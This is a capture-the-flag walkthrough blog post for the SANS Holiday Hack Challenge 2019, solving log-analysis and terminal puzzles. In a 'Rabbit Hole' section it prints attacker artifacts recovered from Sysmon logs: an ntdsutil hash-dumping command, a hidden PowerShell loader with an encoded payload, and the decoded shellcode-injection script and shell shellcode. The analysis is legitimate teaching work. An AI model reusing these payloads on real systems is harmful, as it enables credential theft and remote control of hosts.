---
title: SANS Holiday Hack Challenge 2019
date: 2020-01-17T20:14:59-05:00
categories: [Walkthrough, HolidayHackChallenge]
---
[<img src="/assets/img/2020/01/ElfUniversity.png" />](/assets/img/2020/01/ElfUniversity.png)

## Introduction

Kringle Con begins with you getting off a train at Elf University, the premier institution of higher learning in the ultra far north.

Sure was crowded the first day.
[<img src="/assets/img/2019/12/Train-Station-1024x502.png" />](/assets/img/2019/12/Train-Station.png)

[<img src="/assets/img/2019/12/Goofy-Face.png" align="center" />](/assets/img/2019/12/Goofy-Face.png)

Santa will tell you about how this year&#8217;s KringleCon is at Elf University because of how there were just so many people last year that his castle was a little cramped.

<blockquote class="wp-block-quote">
  <p>
    Welcome to the North Pole and KringleCon 2!<br />Last year, KringleCon hosted over 17,500 attendees and my castle got a little crowded.<br />We moved the event to Elf University (Elf U for short), the North Pole’s largest venue.<br />Please feel free to explore, watch talks, and enjoy the con!
  </p>
</blockquote>

There isn&#8217;t much in the train station to explore. However, you&#8217;ll see the first elf, Bushy Evergreen and his terminal challenge. Also a nice Christmas tree and the train you presumably arrived on. 

To find out the objectives of the game, click on your badge icon to open the Badge. All of the game details are there, including the main storyline, hints the elves give, and talks that can help teach the skills needed to solve objectives.

## Objective 0

Looking at the Objectives tab of the Badge, you&#8217;ll see the first objective. It gives simple instructions to start the game:

<blockquote class="wp-block-quote">
  <p>
    Enter the campus quad and talk to Santa.
  </p>
</blockquote>

The quad is a courtyard in the middle of campus, and in it is Santa with an umbrella. This is what Santa has to say:

<blockquote class="wp-block-quote">
  <p>
    This is a little embarrassing, but I need your help.<br /> Our KringleCon turtle dove mascots are missing!<br /> They probably just wandered off.<br /> Can you please help find them?<br /> To help you search for them and get acquainted with KringleCon, I’ve created some objectives for you. You can see them in your badge.<br /> Where&#8217;s your badge? Oh! It&#8217;s that big, circle emblem on your chest &#8211; give it a tap!<br /> We made them in two flavors &#8211; one for our new guests, and one for those who&#8217;ve attended both KringleCons.<br /> After you find the Turtle Doves and complete objectives 2-5, please come back and let me know.<br /> Not sure where to start? Try hopping around campus and talking to some elves.<br /> If you help my elves with some quicker problems, they&#8217;ll probably remember clues for the objectives.
  </p>
</blockquote>

So you have to complete Objectives 1 &#8211; 5 then Santa will give more of the story to progress with.

## Objective 1 &#8211; Find the Turtle Doves

That point is a good time to explore the campus. The turtle doves are in the Student Union area in front of the fireplace.

<img src="/assets/img/2020/01/image.png" />

## Objective 2 &#8211; Unredact Threatening Document

> Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad.

<blockquote class="wp-block-quote is-style-large">
  <p>
    Answer: DEMAND
  </p>
</blockquote>

The letter is laying on the ground in the corner of the Quad left of the Student Union.

<img src="/assets/img/2020/01/image-1.png" />

Clicking the letter downloads a PDF, and within it most of the text is obstructed by red redaction blocks.

[<img src="/assets/img/2020/01/image-2-1024x957.png" />](/assets/img/2020/01/image-2.png)

The objective is to find a way to read the redacted text. All you have to do is select the text with your mouse or keyboard. I used Ctrl-A to select all the text and Ctrl-C to copy it. Then paste it into a text editor, like notepad, to read what the letter says and get the answer. The answer is &#8220;DEMAND&#8221;.

[<img src="/assets/img/2020/01/image-3-1024x669.png" />](/assets/img/2020/01/image-3.png)

## Objective 3 &#8211; Windows Log Analysis: Evaluate Attack Outcome

> We&#8217;re seeing attacks against the Elf U domain! Using&nbsp;[the event log data](https://downloads.elfu.org/Security.evtx.zip), identify the user account that the attacker compromised using a password spray attack.&nbsp;_Bushy Evergreen is hanging out in the train station and may be able to help you out._ 

<blockquote class="wp-block-quote is-style-large">
  <p>
    Answer: supatree
  </p>
</blockquote>

This objective has a hint from an elf named Bushy Evergreen. Find him on the right side of the train station platform beside a Christmas tree.

<img src="/assets/img/2020/01/image-4.png" />

### Terminal Challenge &#8211; Escape Ed

He will ask for help with his terminal challenge, where he needs to break out of the &#8220;ed&#8221; program.

<blockquote class="wp-block-quote">
  <p>
    Hi, I&#8217;m Bushy Evergreen. Welcome to Elf U!<br /> I&#8217;m glad you&#8217;re here. I&#8217;m the target of a terrible trick.<br /> Pepper Minstix is at it again, sticking me in a text editor.<br /> Pepper is forcing me to learn ed.<br /> Even the hint is ugly. Why can&#8217;t I just use Gedit?<br /> Please help me just quit the grinchy thing.
  </p>
</blockquote>

The banner text for the terminal is:

{% highlight plain_text %}
Oh, many UNIX tools grow old, but this one's showing gray. That Pepper LOLs and rolls her eyes, sends mocking looks my way. I need to exit, run - get out! - and celebrate the yule. Your challenge is to help this elf escape this blasted tool. 
-Bushy Evergreen 
Exit ed. 
1100 
{% endhighlight %}

To solve it, just type &#8220;q&#8221; for quit.

Clicking on Bushy Evergreen after solving his challenge will give you the hint.

<blockquote class="wp-block-quote">
  <p>
    Wow, that was much easier than I&#8217;d thought.<br /> Maybe I don&#8217;t need a clunky GUI after all!<br /> Have you taken a look at the password spray attack artifacts?<br /> I&#8217;ll bet that DeepBlueCLI tool is helpful.<br /> You can check it out on GitHub.<br /> It was written by that Eric Conrad.<br /> He lives in Maine &#8211; not too far from here!
  </p>
</blockquote>

Looking at the Hints tab in the badge will show two hints for Bushy Evergreen:

  1. [Github page for DeepBlueCLI](https://github.com/sans-blue-team/DeepBlueCLI) 
  2. [Eric Conrad on DeepBlueCLI](https://www.ericconrad.com/2016/09/deepbluecli-powershell-module-for-hunt.html) 

### Solution

Clicking on the link in the objective description will download a file, Security.evtx.

**EVTX files**&nbsp;are Microsoft Event Viewer logs that can be viewed using Event Viewer. Bushy Evergreen&#8217;s hints on DeepBlueCLI will provide a very useful tool for reading these files without having to use Windows Event Viewer.

Look for failed logon attempts since this was said to be a password spray attack. Password spray attacks take the same list of passwords and use them against every account hoping one will be valid. Knowing that you can deduce that the compromised account will show a different number of attempts since one of them actually worked.

  1. Download DeepBlueCLI from their Github page and place &#8220;Security.evtx&#8221; in the same directory.
  2. Run DeepBlueCLI against the event log with &#8220;.\DeepBlue.ps1 .\Security.evtx&#8221; (it takes a couple minutes to process)
  3. Find the logon attempts and count how many there are for each account.
  4. The compromised account should have a different number of attempts.

There were many accounts attempted and they have the same number of attempts, 77. We were told there was only one compromised account and you&#8217;ll see there is only one account with an attempt count of 76, and that&#8217;s &#8220;**supatree**&#8220;.

[<img src="/assets/img/2020/01/image-5-1024x701.png" />](/assets/img/2020/01/image-5.png)

## Objective 4 &#8211; Windows Log Analysis: Determine Attacker Technique

> Using&nbsp;[these normalized Sysmon logs](https://downloads.elfu.org/sysmon-data.json.zip), identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process.&nbsp;_For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.

<blockquote class="wp-block-quote is-style-large">
  <p>
    Answer: ntdsutil.exe
  </p>
</blockquote>

This Objective is to analyze a logfile from Sysmon in order to identify the tool used to get credentials from the &#8220;lsass.exe&#8221; process, which is the windows local security subsystem. 

You can get a hint on how to analyze Sysmon files from SugarPlum Mary. He is in Hermey Hall which is located on the left side of the Quad.

[<img src="/assets/img/2020/01/image-6.png" />](/assets/img/2020/01/image-6.png)

<blockquote class="wp-block-quote">
  <p>
    Oh me oh my &#8211; I need some help!<br /> I need to review some files in my Linux terminal, but I can&#8217;t get a file listing.<br /> I know the command is ls, but it&#8217;s really acting up.<br /> Do you think you could help me out? As you work on this, think about these questions:
  </p>
  
  <p>
    1. Do the words in green have special significance?
  </p>
  
  <p>
    2. How can I find a file with a specific name?
  </p>
  
  <p>
    3. What happens if there are multiple executables with the same name in my $PATH?
  </p>
</blockquote>

### Terminal Challenge &#8211; Linux Path

SugarPlum Mary&#8217;s Terminal Challenge is &#8220;Linux Path&#8221; and it&#8217;s about finding and running the correct &#8220;ls&#8221; program.

<pre class="wp-block-preformatted">I need to list <strong>file</strong>s in my <strong>home/</strong>
To check on project logos
But what I see with <strong>ls</strong> there,
Are quotes from desert hobos...

<strong>which</strong> piece of my command does fail?
I surely cannot <strong>find</strong> it.
Make straight my <strong>path</strong> and <strong>locate</strong> that-
I'll praise your skill and sharp wit!

Get a listing (ls) of your current directory.</pre>

The words above in bold are subtle hints to solving this challenge. The problem is that &#8220;ls&#8221; has been replaced by a different file somewhere on the PATH. You can use several of the hinted programs to figure out where the &#8220;ls&#8221; binary is at and run it.

To show WHICH &#8220;ls&#8221; you are currently running:

```
~$ which ls
/usr/local/bin/ls
```

To discover all the &#8220;ls&#8221; files on the current PATH, use &#8220;whereis&#8221;:

```
~$ whereis ls
ls: /bin/ls /usr/local/bin/ls /usr/share/man/man1/ls.1.gz
```

WHEREIS wasn&#8217;t one of the hints given in the banner text, but it&#8217;s the best suited for this problem.

<blockquote class="wp-block-quote">
  <p>
    Afterward, SugarPlum Mary gives his hint:<br />Oh there they are! Now I can delete them. Thanks!<br />Have you tried the Sysmon and EQL challenge?<br />If you aren&#8217;t familiar with Sysmon, Carlos Perez has some great info about it.<br />Haven&#8217;t heard of the Event Query Language?<br />Check out some of&nbsp;<a href="https://www.endgame.com/our-experts/ross-wolf">Ross Wolf</a>&#8216;s work on EQL or that blog post by Josh Wright in your badge.
  </p>
</blockquote>

His Hints in the Badge:

  1. Green words matter, files must be found, and the terminal&#8217;s $PATH matters. 
  2. [EQL Threat Hunting](https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/) 

### Solution

The first hint was for the Terminal Challenge, and the EQL Threat Hunting link goes to a blog post teaching how to use Event Query Language for analyze Windows Event and Sysmon log files.

In the blog post there is a line _&#8220;An attacker with privileged access to a Windows Domain Controller can use&nbsp;`ntdsutil`&nbsp;to create an accessible backup of the domain password hashes.&#8221;_ which describes exactly what you&#8217;re looking for. You could just take _ntdsutil_ from the blog post and put it in the Objective Answer Box to solve the challenge.

Or you can follow the execution through the log. Start with: 

```
eql query -f sysmon-data.json 'process where parent_process_name == "lsass.exe"' | jq
```

Those results will show a &#8220;cmd.exe&#8221; process created. Find what commands were entered by using the process id (PID) for &#8220;cmd.exe&#8221; and searching against the parent process id (PPID).

```
ᐅ eql query -f sysmon-data.json 'process where ppid == 3440' | jq
{
  "command_line": "ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q",
  "event_type": "process",
  "logon_id": 999,
  "parent_process_name": "cmd.exe",
  "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
  "pid": 3556,
  "ppid": 3440,
  "process_name": "ntdsutil.exe",
  "process_path": "C:\\Windows\\System32\\ntdsutil.exe",
  "subtype": "create",
  "timestamp": 132186398470300000,
  "unique_pid": "{7431d376-dee7-5dd3-0000-0010f0c44f00}",
  "unique_ppid": "{7431d376-dedb-5dd3-0000-001027be4f00}",
  "user": "NT AUTHORITY\\SYSTEM",
  "user_domain": "NT AUTHORITY",
  "user_name": "SYSTEM"
}
```

You&#8217;ll see the same output that&#8217;s in the blog post, &#8220;**ntdsutil.exe**&#8220;. And that is the answer to the Objective.

### Rabbit Hole &#8211; Powershell Reversing

Instead of searching by Parent Process ID, I first searched for &#8220;cmd.exe&#8221; against the &#8220;parent\_process\_name&#8221; field. Which gave a lot of results, including some powershell exploits. 

```
{
"command_line": "powershell.exe  -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$en<br>v:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.<br>FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAKne<br>010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEn<br>iDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2et<br>YJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mId<br>lNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4V<br>qB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6<br>Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ<br>5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcw<br>YlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KY<br>qglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiY<br>SDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSq<br>DvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo992<br>5cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLa<br>fNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2<br>w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKS<br>hHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvx<br>JCgAA''))),System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.Redirec<br>tStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=System.Diagnostics.Process]::Start($s);\"",
"event_type": "process",
"logon_id": 999,
"parent_process_name": "cmd.exe",
"parent_process_path": "C:\\Windows\\System32\\cmd.exe",
"pid": 3824,<br>  "ppid": 3768,
"process_name": "powershell.exe",
"process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
"subtype": "create",
"timestamp": 132186397859599980,
"unique_pid": "{7431d376-dea9-5dd3-0000-00108f774f00}",
"unique_ppid": "{7431d376-dea9-5dd3-0000-001024764f00}",
"user": "NT AUTHORITY\\SYSTEM",
"user_domain": "NT AUTHORITY",
"user_name": "SYSTEM"
}
```

Taking the powershell code and formatting it nicely gives:

```
if ([IntPtr]::Size - eq 4) {
    $b = 'powershell.exe'
} else {
    $b = $env: windir + '\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'
};
$s = New - Object System.Diagnostics.ProcessStartInfo;
$s.FileName = $b;
$s.Arguments = '-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(' 'H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA' '))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
$s.UseShellExecute = $false;
$s.RedirectStandardOutput = $true;
$s.WindowStyle = 'Hidden';
$s.CreateNoWindow = $true;
$p = [System.Diagnostics.Process]::Start($s);
```

Extract the FromBase64String, and run it through a base64 decode with:

```
echo -n 'H4sIAKne010...' | base64 -d | xxd
00000000: 1f8b 0800 a9de d35d 0203 b556 6d6f da48  .......]...Vmo.H
00000010: 10fe 9c48 f90f 5685 84ad 108c 036d 9a48  ...H..V......m.H
00000020: 956e cd9b 2138 8118 cc5b d169 63af cdc2  .n..!8...[.ic...
00000030: da06 7b0d 985e fffb 8d01 a7a9 9ade b527  ..{..^.........'
00000040: 9d95 97f5 eecc eccc 33cf ccd8 897d 8bd3  ........3....}..
...
```

That is binary data and if you look up the first few bytes, you&#8217;ll find out that it is a [GZIP file](https://www.filesignatures.net/index.php?page=search&search=1F8B08&mode=SIG). You can save it into a file like so:

```
echo -n 'H4sIAKne010...' | base64 -d > outfile.gz
```

Then unzip the file and look at it&#8217;s contents:

```
ᐅ gzip -d outfile.gz
ᐅ cat outfile
function uM1F {
         Param ($i46, $zVytt)
         $vwxWO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 <code>    return $vwxWO.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vwxWO.GetMethod('GetModuleHandle')).Invoke($null, @($i46)))), $zVytt))</code>
 }
 function nL9 {
         Param (
                 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $kESi,
                 [Parameter(Position = 1)] [Type] $mVd_U = [Void]
         )
 <code>    $yv = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])     $yv.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $kESi).SetImplementationFlags('Runtime, Managed')     $yv.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mVd_U, $kESi).SetImplementationFlags('Runtime, Managed')     return $yv.CreateType()</code>
 }
[Byte[]]$dc = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEIt
KPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1o
MzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnA
AAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA
+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
 $oDm = <a href=":Copy">System.Runtime.InteropServices.Marshal</a>::GetDelegateForFunctionPointer((uM1F kernel32.dll VirtualAlloc), (nL9 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dc.Length,0x3000, 0x40)
 $lHZX = <a href=":Copy">System.Runtime.InteropServices.Marshal</a>::GetDelegateForFunctionPointer((uM1F kernel32.dll CreateThread), (nL9 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oDm,[IntPtr]::Zero,0,[IntPtr]::Zero)
 <a href=":Copy">System.Runtime.InteropServices.Marshal</a>::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 @([IntPtr], [Int32]))).Invoke($lHZX,0xffffffff) | Out-Null
 ```

This is more powershell exploit script, and there&#8217;s another base64 encoded payload. Decode it the same way as before to get another binary string.

```
ᐅ echo -n '/OiCAAAAYInlMc...' | base64 -d | xxd
00000000: fce8 8200 0000 6089 e531 c064 8b50 308b  ......`..1.d.P0.
00000010: 520c 8b52 148b 7228 0fb7 4a26 31ff ac3c  R..R..r(..J&1..<
00000020: 617c 022c 20c1 cf0d 01c7 e2f2 5257 8b52  a|., .......RW.R
00000030: 108b 4a3c 8b4c 1178 e348 01d1 518b 5920  ..J<.L.x.H..Q.Y
00000040: 01d3 8b49 18e3 3a49 8b34 8b01 d631 ffac  ...I..:I.4...1..
00000050: c1cf 0d01 c738 e075 f603 7df8 3b7d 2475  .....8.u..}.;}$u
00000060: e458 8b58 2401 d366 8b0c 4b8b 581c 01d3  .X.X$..f..K.X...
00000070: 8b04 8b01 d089 4424 245b 5b61 595a 51ff  ......D$$[[aYZQ.
00000080: e05f 5f5a 8b12 eb8d 5d68 3332 0000 6877  .__Z....]h32..hw
00000090: 7332 5f54 684c 7726 0789 e8ff d0b8 9001  s2_ThLw&........
000000a0: 0000 29c4 5450 6829 806b 00ff d56a 0a68  ..).TPh).k...j.h
000000b0: c0a8 5680 6802 0011 5c89 e650 5050 5040  ..V.h...\..PPPP@
000000c0: 5040 5068 ea0f dfe0 ffd5 976a 1056 5768  P@Ph.......j.VWh
000000d0: 99a5 7461 ffd5 85c0 740a ff4e 0875 ece8  ..ta....t..N.u..
000000e0: 6700 0000 6a00 6a04 5657 6802 d9c8 5fff  g...j.j.VWh..._.
000000f0: d583 f800 7e36 8b36 6a40 6800 1000 0056  ....~6.6j@h....V
00000100: 6a00 6858 a453 e5ff d593 536a 0056 5357  j.hX.S....Sj.VSW
00000110: 6802 d9c8 5fff d583 f800 7d28 5868 0040  h..._.....}(Xh.@
00000120: 0000 6a00 5068 0b2f 0f30 ffd5 5768 756e  ..j.Ph./.0..Whun
00000130: 4d61 ffd5 5e5e ff0c 240f 8570 ffff ffe9  Ma..^^..$..p....
00000140: 9bff ffff 01c3 29c6 75c1 c3bb e01d 2a0a  ......).u.....*.
00000150: 68a6 95bd 9dff d53c 067c 0a80 fbe0 7505  h......<.|....u.
00000160: bb47 1372 6f6a 0053 ffd5
```

Looking this code up online [shows](https://samsclass.info/127/proj/p8bim.htm) that it is a shellcode created from metasploit with `msfvenom -p windows/shell\_bind\_tcp -f c`

However, it is supremely unhelpful in solving the Objective. What a waste of time.

## Objective 5 &#8211; Network Log Analysis: Determine Compromised System

> The attacks don&#8217;t stop! Can you help identify the IP address of the malware-infected system using these&nbsp;[Zeek logs](https://downloads.elfu.org/elfu-zeeklogs.zip)?&nbsp;_For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry.

<blockquote class="wp-block-quote is-style-large">
  <p>
    Answer: 192.168.134.130
  </p>
</blockquote>

This is another defense related objective where you have to dig through logs and find evidence of the bad guy. You can get a hint on how to analyze these logs from Sparkle Redberry in the Laboratory.

### Terminal Challenge &#8211; Xmas Cheer Laser

[<img src="/assets/img/2020/01/image-7.png" />](/assets/img/2020/01/image-7.png)

<blockquote class="wp-block-quote">
  <p>
    I&#8217;m Sparkle Redberry and Imma chargin&#8217; my laser!<br /> Problem is: the settings are off.<br /> Do you know any PowerShell?<br /> It&#8217;d be GREAT if you could hop in and recalibrate this thing.<br /> It spreads holiday cheer across the Earth …<br /> … when it&#8217;s working!
  </p>
  
  <cite>Sparkle Redberry</cite>
</blockquote>

This terminal challenge is about figuring out how to make PowerShell do what you want in order to solve riddles (a LOT of them). You&#8217;re given a PowerShell prompt that can only process PowerShell commands.

<pre class="wp-block-preformatted">Elf University Student Research Terminal - Christmas Cheer Laser Project
The research department at Elf University is currently working on a top-secret
Laser which shoots laser beams of Christmas cheer at a range of hundreds of   
miles. The student research team was successfully able to tweak the laser to  
JUST the right settings to achieve 5 Mega-Jollies per liter of laser output.  
Unfortunately, someone broke into the research terminal, changed the laser    
settings through the Web API and left a note behind at /home/callingcard.txt. 
Read the calling card and follow the clues to find the correct laser Settings.
Apply these correct settings to the laser using it's Web API to achieve laser 
output of 5 Mega-Jollies per liter.                                           

Use (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info. </pre>

The goal of this challenge is to find the correct settings to calibrate the laser with and apply them. To accomplish that, you have to answer a string of riddles that lead one to another and along the way you will see the calibration settings scattered here and there.

I&#8217;ll step through the riddles and their solutions and highlight the calibration settings. At the end I&#8217;ll point out which setting was found at which riddle.

#### Riddle 1 &#8211; callingcard.txt

A clue to this riddle was given in the banner text, &#8220;/home/callingcard.txt&#8221; and this is how to read it:

```
PS /home/elf> Get-Content /home/callingcard.txt
What's become of your dear laser?
Fa la la la la, la la la la
Seems you can't now seem to raise her!
Fa la la la la, la la la la
Could commands hold riddles in hist'ry?
Fa la la la la, la la la la
Nay! You'll ever suffer myst'ry!
Fa la la la la, la la la la
```

Since the riddle mentions history, use &#8220;Get-History&#8221; command to retrieve the command line history.

```
PS /home/elf> Get-History

 Id CommandLine
 -- -----------
  1 Get-Help -Name Get-Process 
  2 Get-Help -Name Get-* 
  3 Set-ExecutionPolicy Unrestricted 
  4 Get-Service | ConvertTo-HTML -Property Name, Status > C:\services.htm 
  5 Get-Service | Export-CSV c:\service.csv 
  6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv 
  7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
  8 Get-EventLog -Log "Application" 
  9 I have many name=value variables that I share to applications system wide. At a command I w…
 10 Get-Content /home/callingcard.txt
 ```

